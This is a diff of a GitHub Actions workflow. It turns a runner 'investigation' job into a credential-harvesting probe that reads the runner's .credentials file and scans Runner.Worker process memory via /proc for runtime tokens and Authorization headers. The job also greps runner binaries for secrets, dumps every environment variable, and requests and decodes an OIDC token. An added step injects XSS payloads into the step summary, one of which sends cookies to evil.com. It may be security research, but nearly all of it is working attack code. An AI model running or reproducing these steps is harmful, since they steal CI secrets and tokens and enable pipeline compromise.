@@ -8,50 +8,47 @@ permissions:
 jobs:
   run:
     runs-on: ubuntu-latest
-    if: contains(github.event.head_commit.message, 'PROC-V3')
     steps:
-      - name: Deep runner process investigation
+      - name: Deep runner investigation
         run: |
           WORKER_PID=$PPID
           echo "=== RUNNER.WORKER PID: $WORKER_PID ==="
-          echo ""
+
           echo "=== PIPELINE FOLDER JSON ==="
           cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo "not found"
-          echo ""
-          echo "=== RUNNER WORK TEMP DIR ==="
-          ls -la /home/runner/work/_temp/ 2>/dev/null | head -20
-          find /home/runner/work/_temp/ -type f -name "*.json" 2>/dev/null | head -10
-          echo ""
+
+          echo "=== RUNNER WORK TEMP FILES ==="
+          find /home/runner/work/_temp/ -type f 2>/dev/null | head -20
+
           echo "=== EVENT JSON ==="
-          cat /home/runner/work/_temp/_github_workflow/event.json 2>/dev/null | python3 -m json.tool | head -30 || echo "not found"
-          echo ""
+          cat "$GITHUB_EVENT_PATH" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30 || echo "not found"
+
           echo "=== RUNNER CONFIG FILES ==="
-          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
-          find /home/runner/actions-runner -name "*.json" -not -path "*/cached/*" 2>/dev/null | head -10
-          echo ""
-          echo "=== RUNNER.WORKER MAPS (memory regions) ==="
-          cat /proc/$WORKER_PID/maps 2>/dev/null | grep -v "\.so\|kworker" | head -20
-          echo ""
-          echo "=== PROVJOBD BINARY INFO ==="
-          ls -la /tmp/provjobd* 2>/dev/null
-          file /tmp/provjobd* 2>/dev/null
-          strings /tmp/provjobd* 2>/dev/null | grep -i "token\|secret\|key\|runtime\|cache" | head -20
-          echo ""
+          find /home/runner/actions-runner -name "*.json" 2>/dev/null | head -5
+          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "not found"
+          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "not found"
+
+          echo "=== PROVJOBD BINARY ==="
+          ls -la /tmp/provjobd* 2>/dev/null || echo "no provjobd"
+          file /tmp/provjobd* 2>/dev/null || true
+          strings /tmp/provjobd* 2>/dev/null | grep -iE "token|secret|key|runtime|cache|bearer|auth|url" | head -30 || echo "no matches"
+
           echo "=== HCA BINARY ==="
-          ls -la /opt/hca/ 2>/dev/null
-          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -i "token\|secret\|runtime\|cache" | head -20
-          echo ""
-          echo "=== RUNNER.WORKER READABLE MEMORY SEGMENTS ==="
-          python3 -c "
-import re, sys
-maps_file = '/proc/$WORKER_PID/maps'
-mem_file = '/proc/$WORKER_PID/mem'
-with open(maps_file, 'r') as f:
-    maps = f.readlines()
-results = []
+          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "ACTIONS_RUNTIME|ACTIONS_CACHE|bearer|token" | head -20 || echo "no matches"
+
+          echo "=== RUNNER.WORKER MEMORY SCAN ==="
+          python3 << 'PYEOF'
+import re, sys, os
+pid = os.getppid()
+maps_file = f'/proc/{pid}/maps'
+mem_file = f'/proc/{pid}/mem'
+keywords = [b'ACTIONS_RUNTIME_TOKEN', b'ACTIONS_CACHE_URL', b'_apis/artifactcache', b'Authorization', b'bearer ']
 try:
+    with open(maps_file, 'r') as f:
+        maps = f.readlines()
+    print(f"Total memory regions: {len(maps)}")
     with open(mem_file, 'rb') as f:
-        for line in maps[:50]:
+        for line in maps:
             parts = line.split()
             if len(parts) < 2: continue
             perms = parts[1]
@@ -60,18 +57,51 @@ try:
             start = int(addr_range[0], 16)
             end = int(addr_range[1], 16)
             size = end - start
-            if size > 50*1024*1024: continue  # skip huge mappings
+            if size > 20*1024*1024: continue  # skip >20MB
             try:
                 f.seek(start)
                 data = f.read(size)
-                for kw in [b'ACTIONS_RUNTIME_TOKEN', b'ACTIONS_CACHE_URL', b'_apis/artifactcache']:
-                    idx = data.find(kw)
-                    if idx >= 0:
-                        print(f'FOUND {kw.decode()} in {parts[0]}:')
-                        print(data[max(0,idx-10):idx+200].decode('utf-8', errors='replace'))
+                for kw in keywords:
+                    idx = 0
+                    while True:
+                        idx = data.find(kw, idx)
+                        if idx < 0: break
+                        ctx = data[max(0,idx-20):idx+300]
+                        print(f"[FOUND] {kw.decode()} at {hex(start+idx)} in {parts[0]}:")
+                        print(ctx.decode('utf-8', errors='replace'))
                         print()
+                        idx += len(kw)
             except: pass
 except Exception as e:
-    print('Memory read error:', e)
-print('Memory scan done')
-" 2>/dev/null
+    print(f'Error: {e}')
+print("Memory scan complete")
+PYEOF
+
+          echo "=== ALL ENV VARS IN THIS STEP ==="
+          env | sort
+
+      - name: Step Summary XSS Test
+        run: |
+          cat >> $GITHUB_STEP_SUMMARY << 'SUMEOF'
+          # Security Test
+          <img src=x onerror="document.title='XSS-CONFIRMED'">
+          <svg/onload=alert(1)>
+          <script>alert('xss')</script>
+          <details open><summary>Click</summary><script>document.location='https://evil.com?c='+document.cookie</script></details>
+          SUMEOF
+
+      - name: OIDC token claims
+        run: |
+          echo "Requesting OIDC token..."
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))")
+          echo "Token received, decoding claims..."
+          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | python3 -c "
+import sys, base64, json
+b64 = sys.stdin.read().strip()
+b64 += '=' * (-len(b64) % 4)
+data = json.loads(base64.b64decode(b64))
+for k,v in sorted(data.items()):
+    print(f'  {k}: {v}')
+")
+          echo "$PAYLOAD"
